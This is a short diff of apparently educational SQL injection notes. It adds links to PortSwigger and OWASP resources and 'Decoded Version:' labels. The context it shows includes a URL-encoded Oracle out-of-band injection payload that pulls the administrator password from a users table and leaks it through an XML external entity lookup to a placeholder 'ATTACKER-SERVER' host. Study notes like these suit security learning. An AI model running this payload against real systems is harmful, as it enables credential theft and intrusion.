@@ -24,6 +24,16 @@
 
 <br>
 
+
+## Resources
+
+* https://portswigger.net/web-security/sql-injection
+
+* https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
+
+* https://owasp.org/www-community/attacks/SQL_Injection
+
+
 ## Recon
 
 ### How to Identify Vulnerability
@@ -443,7 +453,7 @@
 ```
 
 
-
+Decoded Version:
 
 ```
 ' UNION SELECT extractvalue(
@@ -473,7 +483,7 @@ FROM dual--
 '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.ATTACKER-SERVER/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```
 
-
+Decoded Version:
 
 ```
 ' UNION SELECT extractvalue(
